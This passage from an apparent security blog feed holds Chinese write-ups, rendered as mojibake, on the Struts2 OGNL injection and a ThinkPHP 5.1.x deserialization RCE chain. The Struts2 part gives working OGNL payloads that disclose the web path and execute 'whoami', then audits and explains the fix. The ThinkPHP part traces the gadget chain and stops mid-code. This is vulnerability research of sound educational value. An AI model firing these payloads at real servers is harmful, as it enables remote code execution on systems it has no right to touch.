class="line">é€‰æ‹©å°±æ˜¯è¿‡æ»¤æ»¡è¶³selection æ¡ä»¶çš„é›†åˆå…ƒç´ ï¼Œç±»ä¼¼äºå…³ç³»æ•°æ®åº“çš„çºªå½•æ“ä½œã€‚é€‰æ‹©æ“ä½œçš„è¯­æ³•ä¸ºï¼šcollection.&#123;X YYY&#125;ï¼Œå…¶ä¸­X æ˜¯ä¸€ä¸ªé€‰æ‹©æ“ä½œç¬¦ï¼Œåé¢åˆ™æ˜¯é€‰æ‹©ç”¨çš„é€»è¾‘è¡¨è¾¾å¼ã€‚è€Œé€‰æ‹©æ“ä½œç¬¦æœ‰ä¸‰ç§ï¼š</span><br><span class="line">? é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰å…ƒç´ </span><br><span class="line">^ é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç¬¬ä¸€ä¸ªå…ƒç´ </span><br><span class="line">$ é€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æœ€åä¸€ä¸ªå…ƒç´ </span><br><span class="line">ä¾‹å¦‚ï¼šgroup.userList.&#123;? #txxx.xxx != null&#125;å°†è·å¾—æŸä¸ªgroupä¸­userçš„nameä¸ä¸ºç©ºçš„userçš„åˆ—è¡¨ã€‚</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ©ç”¨">#</a> æ¼æ´åˆ©ç”¨</h3><p>è·å– web è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=<span class="meta">@org</span>.apache.struts2.ServletActionContext<span class="meta">@getRequest()</span>,#response=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">&#x27;/&#x27;</span>)),#response.flush(),#response.close()</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149936.png" alt="image-20230605114857778"></p><p>rce</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;whoami&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149921.png" alt="image-20230605114921788"></p><h3 id="ä»£ç å®¡è®¡"><a class="markdownIt-Anchor" href="#ä»£ç å®¡è®¡">#</a> ä»£ç å®¡è®¡</h3><p>æ¼æ´ç‚¹ï¼š</p><p>xwork-2.0.3-sources.jar!\com\opensymphony\xwork2\util\TextParseUtil.java</p><p>åœ¨ while ä¸‹æ‰“ä¸Šæ–­ç‚¹</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149965.png" alt="image-20230605114938789"></p><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿æˆ‘å°±æŠŠæ‰§è¡Œæ¢æˆ username</p><p>debug ä¸‰è½®ï¼Œindex.jspâ†’loginâ†’nameâ†’%{name} å°±åˆ°äº†</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051149702.png" alt="image-20230605114950361"> é¦–å…ˆæ˜¯éå† expression:login</p><p>æ¥ç€å°±æ˜¯ username</p><p>å¼€å§‹åˆ†æ</p><p>èµ°åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure><p 1+2="">è·å¾—å¯¹è±¡ oï¼Œå€¼ä¸º %</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150064.png" alt="image-20230605115003612">o å¯¹è±¡ä¸ä¸ºç©ºè¿›å…¥å¾ªç¯</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150771.png" alt="image-20230605115016574"></p><p>å†è¿›å…¥ TextUtils.stringSet æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦è®¾ç½®ä¸º null æˆ–â€â€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stringSet</span><span class="params">(String string)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (string != <span class="literal">null</span>) &amp;&amp; !<span class="string">&quot;&quot;</span>.equals(string);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶å®ç¬¬ä¸€æ¬¡çœ‹åˆ°è¿™ä¸ªæ–¹æ³•ä»¥ä¸ºæ˜¯ String å€¼è®¾ç½®ï¼Œç›´æ¥è¿”å›ç©ºï¼Ÿ</p><p>ä½†æ˜¯æ³¨é‡Šå†™çš„æ˜¯åˆ¤æ–­ã€‚ã€‚ã€‚</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150025.png" alt="image-20230605115032838"></p><p 1+2="">ç„¶åä»è¿™ä¸€æ­¥å¼€å§‹ï¼Œå€¼å°±è¢«è§£æä¸º %</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051150708.png" alt="image-20230605115050580"></p><p>å†ä¸€æ¬¡å¾ªç¯å°±è§£æç»“æœäº†</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202306051151721.png" alt="image-20230605115101579"></p><p>å®é™…ä¸Šå°±æ˜¯ translateVariables ä¸‹ï¼Œé€’å½’è§£æ OGNL è¡¨è¾¾å¼ï¼Œå¯¹è¾“å…¥çš„ %{1+2} ç»§ç»­è§£æå¯¼è‡´è¢«æ¶æ„åˆ©ç”¨</p><h3 id="æ¼æ´ä¿®å¤"><a class="markdownIt-Anchor" href="#æ¼æ´ä¿®å¤">#</a> æ¼æ´ä¿®å¤</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="type">int</span> maxLoopCount)</span> &#123;</span><br><span class="line">    <span class="comment">// deal with the &quot;pure&quot; expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loopCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">middle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="literal">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="literal">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­äº†å¾ªç¯çš„æ¬¡æ•°ï¼Œä»è€Œåœ¨è§£æåˆ° %{1+1} çš„æ—¶å€™ä¸ä¼šç»§ç»­å‘ä¸‹é€’å½’</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ognlè¡¨è¾¾å¼&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ognlè¡¨è¾¾å¼&quot;&gt;#&lt;/a&gt; OGNL è¡¨è¾¾å¼&lt;/h3&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Struts2" scheme="https://ki10moc.github.io/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.xRCEæ¼æ´</title>
    <link href="https://ki10moc.github.io/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://ki10moc.github.io/2023/01/12/ThinkPHP5.1.xRCE%E6%BC%8F%E6%B4%9E/</id>
    <published>2023-01-11T16:29:17.000Z</published>
    <updated>2023-01-14T04:20:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€</h2><p>æ•´ä¸ªæµç¨‹ç†è§£ä¸Šå¯èƒ½ä¸æ˜¯å¾ˆå¤æ‚ï¼Œä½†æˆ‘æ„Ÿè§‰æƒ³æŠŠæ•´ä¸ª exp å†™ä¸‹æ¥è¿˜æ˜¯æœ‰ç‚¹å¤æ‚çš„ï¼Œä¸­é—´ debug çš„è¿‡ç¨‹è¿˜æ˜¯éœ€è¦èŠ±æ—¶é—´å»è€ƒç©¶çš„ã€‚</p><h2 id="ä»£ç å®¡è®¡"><a class="markdownIt-Anchor" href="#ä»£ç å®¡è®¡">#</a> ä»£ç å®¡è®¡</h2><p>å…¥å£ç‚¹ä¾ç„¶æ˜¯ <code>windows.php</code>  ä¸‹çš„ <code>__destruct</code></p><p><img src="https://img-blog.csdnimg.cn/000ee35d7ec348a79180a3a4cf45a49c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[Pure</span>(<span class="literal">true</span>)<span class="meta">]</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_exists</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$filename</span></span>): <span class="title">bool</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p><code>file_exists</code>  ä¼šå°†æ–‡ä»¶åå½“åšå­—ç¬¦ä¸²ï¼Œè¿™é‡Œæ¥ç€å¯»æ‰¾ <code>__toString</code>  æ–¹æ³•<br>åœ¨ 5.0 ç‰ˆæœ¬æ˜¯åœ¨ <code>Model</code>  ç±»<br>åœ¨ 5.1 ç‰ˆæœ¬æ˜¯åœ¨ <code>Conversion</code>  ç±»</p><p>ä¸€è·¯è·Ÿè¿›åˆ° <code>toArray</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>       = [];</span><br><span class="line">        <span class="variable">$hasVisible</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;visible <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)      = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;visible[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                    <span class="variable">$hasVisible</span>          = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;hidden <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$val</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$val</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$relation</span>, <span class="variable">$name</span>)     = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$val</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$relation</span>][] = <span class="variable">$name</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$val</span>] = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆå¹¶å…³è”æ•°æ®</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$this</span>-&gt;visible[<span class="variable">$key</span>]);</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                    <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">hidden</span>(<span class="variable">$this</span>-&gt;hidden[<span class="variable">$key</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å…³è”æ¨¡å‹å¯¹è±¡</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) || <span class="literal">true</span> !== <span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;visible[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hidden[<span class="variable">$key</span>]) &amp;&amp; !<span class="variable">$hasVisible</span>) &#123;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">                    <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                        <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$relation</span>) &#123;</span><br><span class="line">                            <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span> ? <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>() : [];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æˆ‘ä»¬æ¥çœ‹è¿™æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span 